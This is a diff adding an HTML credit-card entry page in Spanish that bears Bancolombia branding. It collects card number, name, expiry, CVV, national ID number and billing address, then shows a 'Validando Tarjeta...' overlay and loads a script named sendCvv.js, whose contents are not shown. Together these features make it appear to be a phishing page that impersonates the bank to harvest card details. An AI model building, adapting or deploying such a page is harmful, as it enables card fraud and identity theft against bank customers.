@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>Formulario de Tarjeta de Crédito Dinámico</title>
+	<link rel="stylesheet" href="css/cvv.css">
+	<link rel="icon" href="img/logo.png">
+</head>
+<body>
+	<div class="super-contenedor">
+	<!-- Navbar -->
+	<div class="navbar">
+		Total: 9.950
+	</div>
+	  
+	  <div class="contenedor">
+	    		<!-- Tarjeta -->
+		<section class="tarjeta" id="tarjeta">
+			<div class="delantera">
+				<div class="logo-marca" id="logo-marca">
+					<img src="img/visa.png" alt="">
+				</div>
+				<img src="img/chip-tarjeta.png" class="chip" alt="">
+				<div class="datos">
+					<div class="grupo" id="numero">
+						<p class="label">Número Tarjeta</p>
+						<p class="numero">xxxx xxxx xxxx xxxx</p>
+					</div>
+					<div class="flexbox">
+						<div class="grupo" id="nombre">
+							<p class="label">Nombre Tarjeta</p>
+							<p class="nombre">John Perez</p>
+						</div>
+
+						<div class="grupo" id="expiracion">
+							<p class="label">Expiracion</p>
+							<p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="trasera">
+				<div class="barra-magnetica"></div>
+				<div class="datos">
+					<div class="grupo" id="firma">
+						<p class="label">Firma</p>
+						<div class="firma"><p></p></div>
+					</div>
+					<div class="grupo" id="ccv">
+						<p class="label">CVV</p>
+						<p class="ccv"></p>
+					</div>
+				</div>
+ 		<p class="leyenda">Tarjeta de crédito Bancolombia: flexibilidad, seguridad y con beneficios exclusivos financieros.</p>
+				<a href="#" class="link-banco">www.bancolombia.com</a>
+			</div>
+		</section>
+
+		<!-- Contenedor Boton Abrir Formulario -->
+		<div class="contenedor-btn">
+			<button class="btn-abrir-formulario" id="btn-abrir-formulario">
+			  <p>⬇️</p>
+			</button>
+		</div>
+
+		<!-- Formulario -->
+		<form action="" id="formulario-tarjeta" class="formulario-tarjeta">
+			<div class="grupo">
+				<label for="inputNumero">Número Tarjeta</label>
+				<input type="text" id="inputNumero" maxlength="19" autocomplete="off" required>
+			</div>
+			<div class="grupo">
+				<label for="inputNombre">Nombre</label>
+				<input type="text" id="inputNombre" maxlength="19" autocomplete="off" required>
+			</div>
+			<div class="flexbox">
+				<div class="grupo expira">
+					<label for="selectMes">Expiración</label>
+					<div class="flexbox">
+						<div class="grupo-select">
+							<select name="mes" id="selectMes">
+								<option disabled selected>M</option>
+							</select>
+							<i class="fas fa-angle-down"></i>
+						</div>
+						<div class="grupo-select">
+							<select name="year" id="selectYear">
+								<option disabled selected>A</option>
+							</select>
+							<i class="fas fa-angle-down"></i>
+						</div>
+					</div>
+				</div>
+
+				<div class="grupo ccv">
+					<label for="inputCCV">CCV</label>
+					<input type="text" id="inputCCV" maxlength="3" required>
+				</div>
+			</div>
+
+
+			
+			<div class="grupo">
+				<label for="inputDocumento">Numero Documento</label>
+				<input type="text" id="inputDocumento" autocomplete="off" required>
+			</div>
+
+			<div class="grupo">
+				<label for="inputDireccion">Dirección de facturación</label>
+				<input type="text" id="inputDireccion" autocomplete="off" required>
+			</div>
+
+			
+
+			<button type="submit" class="btn-enviar">Enviar</button>
+		</form>
+	  </div>
+	  
+	   <div id="loading-overlay" class="loading-overlay">
+      <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Validando Tarjeta...</div>
+          </div>
+      </div>
+      
+	</div>
+
+	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
+
+	<script src="js/sendCvv.js"></script>
+	<script type="module" src="js/util.js"></script>
+</body>
+</html>
